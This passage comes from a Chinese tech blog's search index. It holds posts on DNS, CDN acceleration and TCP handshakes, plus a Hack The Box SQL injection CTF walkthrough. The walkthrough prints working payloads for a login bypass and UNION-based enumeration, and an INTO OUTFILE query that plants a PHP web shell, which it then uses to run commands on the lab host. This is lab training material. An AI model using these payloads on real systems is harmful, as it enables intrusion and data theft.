number）等。</p><h4 id="URL转发"><a href="#URL转发" class="headerlink" title="URL转发"></a>URL转发</h4><p>通过服务器的特殊设置，将当前访问的域名指向另一个指定的网络地址。<br>根据目标地址的隐藏与否，URL转发可以分为显性URL和隐性URL两种。</p><p>显性URL：将域名指向一个http(s)协议地址，访问域名时，自动跳转至目标地址，地址栏显示为目标网站地址。</p><p>隐性URL：与显性URL类似，但隐性转发会隐藏真实的目标地址，地址栏中显示为仍为此前输入的地址。</p><p><strong>有点类似重定向</strong></p><div class="note simple"><p>记录类型当然也会有共存冲突：</p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2023/12/30/658fe68cdb22f.jpg" style="width:600px;"/></div></div></div><h2 id="推荐视频"><a href="#推荐视频" class="headerlink" title="推荐视频"></a>推荐视频</h2><div calss='anzhiyu-tag-link'><a class="tag-Link" target="_blank" href="https://www.bilibili.com/video/BV1uL4y1B7aE/?spm_id_from=333.788&vd_source=91a233ea2e45cea087336c119461d12b">    <div class="tag-link-tips">引用站外地址</div>    <div class="tag-link-bottom">        <div class="tag-link-left" style="background-image: url(https://www.freeimg.cn/i/2023/12/30/658fb2cbc152c.png)">          <i class="anzhiyufont anzhiyu-icon-link" style="display: none"></i>        </div>        <div class="tag-link-right">            <div class="tag-link-title">DNS域名解析过程</div>            <div class="tag-link-sitename">技术蛋老师</div>        </div>        <i class="anzhiyufont anzhiyu-icon-angle-right"></i>    </div>    </a></div><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>不管在DNS还是CDN的应用中，Web通信中还有一项非常重要的技术，感兴趣的同学可以观看这篇<a href="https://blog.xxfer.cn/posts/3f3de275.html">CDN服务商是如何解决安全问题的？</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> DNS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB：SQL Injection Fundamentals 详解</title>
      <link href="/posts/b4bc7df4.html"/>
      <url>/posts/b4bc7df4.html</url>
      <cover>https://www.freeimg.cn/i/2023/11/03/6544e6570e11e.jpg</cover>
      <date>Fri Jul 28 2023 00:33:08 GMT+0000</date>
      
        <content type="html"><![CDATA[<h2 id="SQL-Injection-Fundamentals"><a href="#SQL-Injection-Fundamentals" class="headerlink" title="SQL Injection Fundamentals"></a>SQL Injection Fundamentals</h2><h3 id="题目：SQL-注入基础"><a href="#题目：SQL-注入基础" class="headerlink" title="题目：SQL 注入基础"></a>题目：SQL 注入基础</h3><p><img src="/img/SQL_Injection_Fundamentals/2.png" alt="图例"></p><p><img src="/img/SQL_Injection_Fundamentals/%E9%A2%98%E5%B9%B21.png" alt="图例"></p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ol><li><p>“remote code execution”（RCE）——远程代码&#x2F;命令执行：属于服务端漏洞，由于开发人员在开发相关命令调用功能时，没有对用户输入的数据进行过滤和验证操作，导致攻击者输入的恶意代码字符被带入后端服务器执行，从而产生危害应用服务器的后果。</p></li><li><p>进入目标页面：</p><p><img src="/img/SQL_Injection_Fundamentals/%E7%9B%AE%E6%A0%871.png" alt="图例"></p></li><li><p>因为该漏洞的产生，就是基于攻击者的输入，由于后端服务端在实现某些服务时需要将用户输入的信息作为参数调用函数&#x2F;方法，如果服务端没有对输入进行验证&#x2F;过滤等安全操作，攻击者就可以基于服务端代码的语法注入恶意代码，服务端执行该段代码，最终实现攻击目的。</p><p>因此，根据题目要求，我们需要获取文件系统中的 &#x2F;root（根目录）下的 flag ，在目标页面的 Username 和 Password 注入能够让服务端执行的且能获取对应目录下 flag 内容的代码即可完成注入攻击。</p><p><strong>核心思路：将用户输入的数据拼接到代码中，并且被当成 sql 语句执行。</strong></p></li><li><p>因为一般登录框与 MySQL 数据库进行交互的 sql 语句为</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select name.passwd from users where username=‘name’ and password=‘pwd’;</span><br></pre></td></tr></table></figure><p>所以尝试在用户名框中注入<code> &#39;or 1=1#</code>，密码框中输入任意简单字符,以避免空字符错误，这样原有的 sql 语句就改为</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select name.passwd from users where username=‘or 1=1#’ and password=‘pwd’;</span><br></pre></td></tr></table></figure><p># 后面的内容就会变成注释，即密码部分失效，因为 1&#x3D;1 为真，所以整个条件语句为真，成功绕过了登录页面：</p><p><img src="/img/SQL_Injection_Fundamentals/%E7%9B%AE%E6%A0%872.png" alt="图例"></p><p>只有绕过了登录，获取一个用户身份，才能对数据库进行下一步操作。也可以使用 sqlmap 工具。</p></li><li><p>虽然已经绕过了登录页面，但访问到的文件是 &#x2F;dashboard&#x2F;dashboard.php ，不是目标文件。之后好像无从下手了，基于 SQL 注入的思路，现在只有对 SEARCH 栏的输入数据进行操作。这是一种搜索类型的 SQL 注入。</p><p>以下是我做的尝试：</p><p>a）首先判断是否存在注入点</p><p>搜索框后端 sql 代码格式一般是这样的：查询 name 字段包含’keyword‘的全部数据。</p><p><code>select * from users where name like &#39;%keyword%&#39;</code></p><p>尝试输入<code>11‘</code>，服务端的查询语句就变为</p><p><code>select * from users where name like &#39;%11&#39;%&#39;</code></p><p>根据 sql 语法这是错误的。</p><p>返回信息如下：</p><p><img src="/img/SQL_Injection_Fundamentals/%E7%9B%AE%E6%A0%873.png" alt="图例"></p><p>SQL 语句执行存在错误，说明有 80 - 90% 存在 SQL 注入点，那么就可以基于注入点进行代码注入，让服务端执行我们想要的 sql 操作。</p><p>b）查看表单有多少列</p><p>注入<code>11&#39; UNION SELECT 1,2,3,4,5-- -</code>，返回信息如下：</p><p><img src="/img/SQL_Injection_Fundamentals/%E7%9B%AE%E6%A0%8716.png" alt="图例"></p><p>构建了一个数组，select 的对象不指向数据库中的表，而是指向这个数组，所以输出信息就是我们注入的数字字符 1-5。根据返回信息，第 1 列被隐藏，该表有 5 列。</p><p>c）查看数据库（DB）类型</p><p>注入<code>11&#39; UNION SELECT 1,@@VERSION,3,4,5-- -</code>，返回信息如下：</p><p><img src="/img/SQL_Injection_Fundamentals/%E7%9B%AE%E6%A0%874.png" alt="图例"></p><p>将数据库的类型输出到第二列，说明该数据库是 MariaDB 类型。</p><p>d）查看当前所处的数据库名称</p><p>注入<code>11&#39; UNION SELECT 1,DATABASE(),3,4,5-- -</code>，返回信息如下：</p><p><img src="/img/SQL_Injection_Fundamentals/%E7%9B%AE%E6%A0%875.png" alt="图例"></p><p>说明当前所看到的内容来自 ilfreight 数据库。</p><p>e）查看当前使用的用户名</p><p>注入<code>11&#39; UNION SELECT 1,USER(),3,4,5-- -</code>，返回信息如下：</p><p><img src="/img/SQL_Injection_Fundamentals/%E7%9B%AE%E6%A0%876.png" alt="图例"></p><p>说明当前用户名为 \root@localhost 。</p><p>f）查看该用户是否为管理员</p><p>注入</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cn&#x27; UNION SELECT 1, super<span class="emphasis">_priv, 3, 4, 5 FROM mysql.user WHERE user=&quot;root&quot;-- -</span></span><br></pre></td></tr></table></figure><p>返回信息如下：</p><p><img src="/img/SQL_Injection_Fundamentals/%E7%9B%AE%E6%A0%877.png" alt="图例"></p><p>返回为 Y，说明当前用户是管理员身份。</p><p>g）查看当前用户的权限</p><p>注入</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cn&#x27; UNION SELECT 1, grantee, privilege<span class="emphasis">_type, is_</span>grantable, 5 FROM information<span class="emphasis">_schema.user_</span>privileges -- -</span><br></pre></td></tr></table></figure><p>返回信息如下：</p><p><img src="/img/SQL_Injection_Fundamentals/%E7%9B%AE%E6%A0%878.png" alt="tuli "></p><p>可以找到当前用户拥有 CREATE 权限，为后续注入 Web shell 奠定了条件。</p></li><li><p>要想获取 flag 文件的内容，需要找到它的具体路径，这样才能使用 cat 或 find 命令查找。</p><p>为了找到文件具体位置，需要写一个 <strong>web shell</strong> 到服务端，获取其他权限，然后通过访问这个 web shell 来执行 shell 文件中的命令，查找到 flag 文件的位置。</p><p>写一个 web shell 的方法有很多，但是最常用的一种是使用 INTO OUTFILE 语句，这个语句可以将查询的结果写入到一个指定的文件中。利用这个语句，将一些 PHP 代码写入到服务器的 web 目录下，比如 &#x2F;var&#x2F;www&#x2F;html，然后给这个文件一个 .php 的扩展名，这样就创建了一个 web shell。</p></li><li><p>但是当尝试将 php shell 写入 &#x2F;var&#x2F;www&#x2F;html 时，因为权限的问题无法写入。</p><p>尝试的方法还是 SQL 注入，注入</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CN&#x27; UNION SELECT &quot;&quot;,&#x27;&lt;?PHP SYSTEM($<span class="emphasis">_REQUEST[0]); ?&gt;&#x27;, &quot;&quot;, &quot;&quot;, &quot;&quot; INTO OUTFILE &#x27;/VAR/WWW/HTML/SHELL.PHP&#x27;-- -</span></span><br></pre></td></tr></table></figure><p>该语句就是</p><p><img src="/img/SQL_Injection_Fundamentals/%E7%9B%AE%E6%A0%8710.png" alt="图例"></p><p>因为在当前目录下没有权限，所以我尝试将 shell 文件写入其他的目录下（&#x2F;tmp 等），但难以实现服务器读取 shell ，或者使用其他的扩展名（.txt&#x2F;.jpg 等），只要网页能够将这些文件解析为 php 代码，但是依旧难以实现，所以貌似又行不通。</p></li><li><p>那么，应该这样才能让服务端成功执行 Web shell，从而获取目标文件的位置呢？</p><p>答案在页面的 url 中，因为绕过登录以后所在 url 为[<a href="http://142.93.39.188:30698/dashboard/dashboard.php]">http://142.93.39.188:30698/dashboard/dashboard.php]</a> 是通过 Web 直接进行访问的，所以可以猜测 dashboard.php 应该存放在 &#x2F;var&#x2F;www&#x2F;html 下。因此，只要将 Web shell 文件注入到 &#x2F;var&#x2F;www&#x2F;html&#x2F;dashboard 下，因为在该目录下拥有注入权限，执行注入的 shell.php 文件，从而实现 flag 文件位置信息查找。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CN&#x27; UNION SELECT &quot;&quot;,&#x27;&lt;?PHP SYSTEM($<span class="emphasis">_REQUEST[0]); ?&gt;&#x27;, &quot;&quot;, &quot;&quot;, &quot;&quot; INTO OUTFILE &#x27;/VAR/WWW/HTML/DASHBOARD/SHELL.PHP&#x27;-- -</span></span><br></pre></td></tr></table></figure><p>执行以后，服务端将位置信息返回到浏览器：</p><p>注入的 php 代码为 <? PHP SYSTEM($_REQUEST[0]);?> 意思是执行用户输入的命令</p><p><img src="/img/SQL_Injection_Fundamentals/%E7%9B%AE%E6%A0%8711.png" alt="图例"></p><p>没有报错信息，说明应该成功注入。</p></li><li><p>更改 url 参数查看注入情况，通过访问 shell.php 文件，执行文件中注入的 php 代码。下面的 url 就是访问 shell.php 文件，”?”以后的 “0&#x3D;id” 代表一个命令参数，其中0为变量名，id为显示当前用户ID的命令。当 shell 文件被访问 php 代码执行时，其中的 $_REQUEST[0] 代表获取对象 0 的REQUEST请求，即命令 id。其中，SYSTEM函数的作用就是将命令执行的结果直接输出到屏幕上。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://157.245.38.221:30911/dashboard/shell.php?0=id</span><br></pre></td></tr></table></figure><p><img src="/img/SQL_Injection_Fundamentals/%E7%9B%AE%E6%A0%8712.png" alt="图例"></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://157.245.38.221:30911/dashboard/shell.php?0=pwd</span><br></pre></td></tr></table></figure><p><img src="/img/SQL_Injection_Fundamentals/%E7%9B%AE%E6%A0%8713.png" alt="图例"></p><p>说明 Web shell 成功注入到 &#x2F;var&#x2F;www&#x2F;html&#x2F;dashboard 下。</p></li><li><p>接下来，只要成功执行 shell.php 文件即可获取位置信息</p><p>因为没有 flag 文件的具体路径，而且标志文件名也不一定是 flag.txt ，所以无法通过使用 cat 命令查看目标文件的内容。因此先将该目录下的所有文件名列举出来，找出受标志的文件即可：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://157.245.38.221:30911/dashboard/shell.php?0=ls ../../../../</span><br></pre></td></tr></table></figure><p><img src="/img/SQL_Injection_Fundamentals/%E7%9B%AE%E6%A0%8714.png" alt="图例"></p><p>成功找到标志文件 flag_cae1dadcd174.txt。</p><p>如果没有找到这个文件，或者没有权限访问它，就可能需要使用一些其他的方法，比如利用 SQL 注入来读取数据库中的数据，或者利用 SQL 注入来提升你的权限，或者利用 SQL 注入来执行一些更高级的命令，比如反弹一个 shell 到自己的机器上。</p></li><li><p>直接使用 cat 命令查看文件内容即可。</p><p><code>http://&lt;server_ip&gt;/&lt;web_shell&gt;?cmd=cat /root/flag.txt</code></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://157.245.38.221:30911/dashboard/shell.php?0=ls ../../../../flag<span class="emphasis">_cae1dadcd174.txt</span></span><br></pre></td></tr></table></figure><p><img src="/img/SQL_Injection_Fundamentals/%E7%9B%AE%E6%A0%8715.png" alt="图例"></p><p>上述的 Web shell 只是一种方式，当然可以注入其他内容，使得执行一次 shell 文件就获取到受标志的文件内容。<strong>也可以通过注入多个 shell 文件，每一个文件执行一项命令，同样能够实现对 flag 文件的获取。</strong></p></li></ol><h3 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h3><p><img src="/img/SQL_Injection_Fundamentals/%E7%AD%94%E6%A1%88.png" alt="图例"></p>]]></content>
      
      
      <categories>
          
          <category> 夺旗赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> CTF </tag>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网站资源类型及其加速原理</title>
      <link href="/posts/d98373ae.html"/>
      <url>/posts/d98373ae.html</url>
      <cover>https://www.freeimg.cn/i/2024/02/27/65dd7030e0df2.jpg</cover>
      <date>Sun Jun 11 2023 12:16:08 GMT+0000</date>
      
        <content type="html"><![CDATA[<h2 id="静态资源"><a href="#静态资源" class="headerlink" title="静态资源"></a>静态资源</h2><p>静态内容是指在不同请求中访问到的数据都相同的静态文件。例如：图片、视频、网站中的文件（html、css、js）、软件安装包、apk文件、压缩包文件等。</p><p>CDN加速的本质是缓存加速。将服务器上存储的静态内容缓存在CDN节点上，当访问这些静态内容时，无需访问服务器源站，就近访问CDN节点即可获取相同内容。从而达到加速的效果，同时减轻服务器源站的压力。</p><h2 id="动态资源"><a href="#动态资源" class="headerlink" title="动态资源"></a>动态资源</h2><p>动态内容是指在不同请求中访问到的数据不相同的动态内容。例如：网站中的文件（asp、jsp、php、perl、cgi）、API接口、数据库交互请求等。</p><p>当访问这些动态内容时，每次都需要访问（源）服务器，由服务器动态生成实时的数据并返回给您。因此CDN的缓存加速不适用于加速动态内容，CDN无法缓存实时变化的动态内容。对于动态内容请求，CDN节点只能转发回服务器源站，没有加速效果。</p><p>如果网站或App应用有较多动态内容，例如需要对各种API接口进行加速，则需要使用全站加速。全站加速能同时加速动态和静态内容，加速方式如下：<br>静态内容使用CDN加速。<br>动态内容通过路由优化、传输优化等动态加速技术以最快的速度访问服务器源站获取数据。从而达到全站加速的效果。</p><h2 id="网络加速方式"><a href="#网络加速方式" class="headerlink" title="网络加速方式"></a>网络加速方式</h2><ul><li>缩短与服务器间的物理距离</li><li>把长距离公网传输改为稳定的内网传输</li></ul><h2 id="技术方案"><a href="#技术方案" class="headerlink" title="技术方案"></a>技术方案</h2><p>针对<strong>缩短与服务器间的物理距离</strong>，目前主流的方案就是<strong>静态CDN服务</strong>，一般解决的就是静态资源的加速，相信看本篇博客的同学应该都不陌生，这里不再赘述。针对<strong>把长距离公网传输改为稳定的内网传输</strong>的加速方案，大致可以归类为<strong>动态内容加速</strong>、<strong>全球应用加速</strong>和<strong>Anycast</strong>三种。</p><div class="note orange anzhiyufont anzhiyu-icon-dengpao simple"><p>这里提到的“Anycast”就是任播技术，其实它在静态CDN也会应用到，用于定位就近CDN节点。还会应用在负载均衡上。</p></div><p>关于动态资源加速的方式原理大家可以参考这篇文章，<a href="https://blog.csdn.net/deng_xj/article/details/109679797">网络加速原理与方法</a>，讲得挺详细了。</p>]]></content>
      
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小结：TCP的三握四挥</title>
      <link href="/posts/3980e700.html"/>
      <url>/posts/3980e700.html</url>
      <cover>https://www.freeimg.cn/i/2024/02/26/65dc895d5b7b4.jpg</cover>
      <date>Mon Jun 05 2023 12:16:08 GMT+0000</date>
      
        <content type="html"><![CDATA[<p>不想看博客的，可以直接看下面这个视频：</p><div calss='anzhiyu-tag-link'><a class="tag-Link" target="_blank" href="https://www.bilibili.com/video/BV18h41187Ep/?spm_id_from=333.999.0.0&vd_source=91a233ea2e45cea087336c119461d12b">    <div class="tag-link-tips">引用站外地址</div>    <div class="tag-link-bottom">        <div class="tag-link-left" style="background-image: url(https://www.freeimg.cn/i/2023/12/30/658fb2cbc152c.png)">          <i class="anzhiyufont anzhiyu-icon-link" style="display: none"></i>        </div>        <div class="tag-link-right">            <div class="tag-link-title">TCP的三次握手和四次挥手</div>            <div class="tag-link-sitename">技术蛋老师</div>        </div>        <i class="anzhiyufont anzhiyu-icon-angle-right"></i>    </div>    </a></div><h2 id="TCP的三次握手"><a href="#TCP的三次握手" class="headerlink" title="TCP的三次握手"></a>TCP的三次握手</h2><p>为了保证客户端和服务器端的可靠连接，TCP建立连接时必须要进行三次会话，也叫TCP三次握手，进行三次握手的目的是为了<strong>确认双方的接收能力和发送能力是否正常</strong>。</p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/03/07/65e95a2f0bc06.png"/></div></div><ul><li><p>第一次握手： 客户端向服务器端发送报文<br>证明客户端的发送能力正常</p></li><li><p>第二次握手：服务器端接收到报文并向客户端发送报文<br>证明服务器端的接收能力、发送能力正常</p></li><li><p>第三次握手：客户端向服务器发送报文<br>证明客户端的接收能力正常</p></li></ul><div class="note orange anzhiyufont anzhiyu-icon-dengpao simple"><p>视频里也提到了，如果客户端只是大量的发送SYN报文，而没有后续确认，就是DDos中的SYN泛洪攻击。</p></div><h2 id="TCP的四次挥手"><a href="#TCP的四次挥手" class="headerlink" title="TCP的四次挥手"></a>TCP的四次挥手</h2><p>建立TCP连接需要三次握手，<strong>终止</strong>TCP连接需要四次挥手</p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/03/07/65e95a3db658e.png"/></div></div>]]></content>
      
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>